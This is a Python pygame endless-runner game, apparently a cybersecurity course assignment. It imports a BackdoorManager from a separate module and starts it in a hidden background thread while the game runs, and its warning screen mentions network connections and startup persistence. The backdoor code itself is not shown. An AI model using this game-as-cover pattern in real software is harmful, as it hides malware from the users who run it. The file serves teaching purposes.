#!/usr/bin/env python3
"""
Cyber Runner - Educational Backdoor Game
A Temple Run-style endless runner with cybersecurity educational features
For educational purposes only - Rwanda Coding Academy Assignment
"""

import pygame
import sys
import os
import threading
import time
import random
from backdoor_utils import BackdoorManager

# Initialize Pygame
pygame.init()

# Constants
SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
FPS = 60

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 100, 255)
YELLOW = (255, 255, 0)
GRAY = (128, 128, 128)

class Player:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        self.width = 40
        self.height = 60
        self.vel_y = 0
        self.jumping = False
        self.slide = False
        self.slide_timer = 0
        
    def jump(self):
        if not self.jumping:
            self.vel_y = -15
            self.jumping = True
            
    def slide_action(self):
        if not self.slide:
            self.slide = True
            self.slide_timer = 30
            
    def update(self):
        # Gravity
        if self.jumping:
            self.vel_y += 0.8
            self.y += self.vel_y
            
            # Landing
            if self.y >= 400:
                self.y = 400
                self.jumping = False
                self.vel_y = 0
                
        # Slide timer
        if self.slide_timer > 0:
            self.slide_timer -= 1
            if self.slide_timer == 0:
                self.slide = False
                
    def draw(self, screen):
        if self.slide:
            # Draw sliding player (smaller rectangle)
            pygame.draw.rect(screen, BLUE, (self.x, self.y + 40, self.width, 20))
        else:
            # Draw normal player
            pygame.draw.rect(screen, BLUE, (self.x, self.y, self.width, self.height))

class Obstacle:
    def __init__(self, x, obstacle_type):
        self.x = x
        self.type = obstacle_type  # 'jump' or 'slide'
        self.width = 30
        self.height = 50 if obstacle_type == 'jump' else 30
        self.y = 400 if obstacle_type == 'jump' else 430
        
    def update(self, speed):
        self.x -= speed
        
    def draw(self, screen):
        color = RED if self.type == 'jump' else YELLOW
        pygame.draw.rect(screen, color, (self.x, self.y, self.width, self.height))

class CyberRunnerGame:
    def __init__(self):
        self.screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
        pygame.display.set_caption("Cyber Runner - Educational Game")
        self.clock = pygame.time.Clock()
        self.font = pygame.font.Font(None, 36)
        self.small_font = pygame.font.Font(None, 24)
        
        # Game objects
        self.player = Player(100, 400)
        self.obstacles = []
        self.score = 0
        self.speed = 5
        self.game_over = False
        self.running = True
        
        # Timers
        self.obstacle_timer = 0
        self.speed_timer = 0
        
        # Backdoor manager
        self.backdoor = BackdoorManager()
        
    def show_warning_screen(self):
        """Show educational disclaimer before game starts"""
        self.screen.fill(BLACK)
        
        warnings = [
            "CYBER RUNNER - EDUCATIONAL GAME",
            "",
            "This game is for EDUCATIONAL PURPOSES ONLY",
            "Part of Cybersecurity Course Assignment",
            "",
            "This game will:",
            "- Check system dependencies",
            "- Create network connections for educational demos",
            "- Modify system startup for persistence testing",
            "",
            "Only run in a controlled VM environment!",
            "",
            "Press SPACE to continue or ESC to exit"
        ]
        
        y = 100
        for line in warnings:
            if line == "CYBER RUNNER - EDUCATIONAL GAME":
                text = self.font.render(line, True, GREEN)
            elif line.startswith("This game will:"):
                text = self.small_font.render(line, True, YELLOW)
            else:
                text = self.small_font.render(line, True, WHITE)
            
            text_rect = text.get_rect(center=(SCREEN_WIDTH // 2, y))
            self.screen.blit(text, text_rect)
            y += 30
            
        pygame.display.flip()
        
        waiting = True
        while waiting:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_SPACE:
                        waiting = False
                    elif event.key == pygame.K_ESCAPE:
                        pygame.quit()
                        sys.exit()
                        
    def spawn_obstacle(self):
        if self.obstacle_timer <= 0:
            obstacle_type = random.choice(['jump', 'slide'])
            self.obstacles.append(Obstacle(SCREEN_WIDTH, obstacle_type))
            self.obstacle_timer = random.randint(60, 120)
        else:
            self.obstacle_timer -= 1
            
    def check_collisions(self):
        player_rect = pygame.Rect(self.player.x, self.player.y, 
                                 self.player.width, 
                                 20 if self.player.slide else self.player.height)
        
        for obstacle in self.obstacles:
            obstacle_rect = pygame.Rect(obstacle.x, obstacle.y, 
                                      obstacle.width, obstacle.height)
            if player_rect.colliderect(obstacle_rect):
                # Check if correct action was taken
                if obstacle.type == 'jump' and self.player.jumping:
                    continue  # Correctly jumped over
                elif obstacle.type == 'slide' and self.player.slide:
                    continue  # Correctly slid under
                else:
                    return True  # Collision!
        return False
        
    def update(self):
        if self.game_over:
            return
            
        # Update player
        self.player.update()
        
        # Spawn and update obstacles
        self.spawn_obstacle()
        for obstacle in self.obstacles[:]:
            obstacle.update(self.speed)
            if obstacle.x < -50:
                self.obstacles.remove(obstacle)
                self.score += 10
                
        # Check collisions
        if self.check_collisions():
            self.game_over = True
            
        # Increase speed over time
        self.speed_timer += 1
        if self.speed_timer >= 300:  # Every 5 seconds at 60 FPS
            self.speed += 0.5
            self.speed_timer = 0
            
    def draw(self):
        # Background
        self.screen.fill(BLACK)
        
        # Draw ground
        pygame.draw.rect(self.screen, GRAY, (0, 460, SCREEN_WIDTH, 140))
        
        # Draw player
        self.player.draw(self.screen)
        
        # Draw obstacles
        for obstacle in self.obstacles:
            obstacle.draw(self.screen)
            
        # Draw UI
        score_text = self.font.render(f"Score: {self.score}", True, WHITE)
        self.screen.blit(score_text, (10, 10))
        
        speed_text = self.small_font.render(f"Speed: {self.speed:.1f}", True, WHITE)
        self.screen.blit(speed_text, (10, 50))
        
        # Instructions
        inst_text = self.small_font.render("SPACE: Jump | DOWN: Slide", True, WHITE)
        self.screen.blit(inst_text, (SCREEN_WIDTH - 250, 10))
        
        if self.game_over:
            game_over_text = self.font.render("GAME OVER!", True, RED)
            text_rect = game_over_text.get_rect(center=(SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2))
            self.screen.blit(game_over_text, text_rect)
            
            restart_text = self.small_font.render("Press R to Restart or ESC to Exit", True, WHITE)
            text_rect = restart_text.get_rect(center=(SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2 + 40))
            self.screen.blit(restart_text, text_rect)
            
        pygame.display.flip()
        
    def reset_game(self):
        self.player = Player(100, 400)
        self.obstacles = []
        self.score = 0
        self.speed = 5
        self.game_over = False
        self.obstacle_timer = 0
        self.speed_timer = 0
        
    def run(self):
        # Show warning screen first
        self.show_warning_screen()
        
        # Initialize backdoor in background
        backdoor_thread = threading.Thread(target=self.backdoor.initialize, daemon=True)
        backdoor_thread.start()
        
        while self.running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.running = False
                elif event.type == pygame.KEYDOWN:
                    if not self.game_over:
                        if event.key == pygame.K_SPACE:
                            self.player.jump()
                        elif event.key == pygame.K_DOWN:
                            self.player.slide_action()
                    else:
                        if event.key == pygame.K_r:
                            self.reset_game()
                        elif event.key == pygame.K_ESCAPE:
                            self.running = False
                            
            self.update()
            self.draw()
            self.clock.tick(FPS)
            
        pygame.quit()
        sys.exit()

if __name__ == "__main__":
    game = CyberRunnerGame()
    game.run()
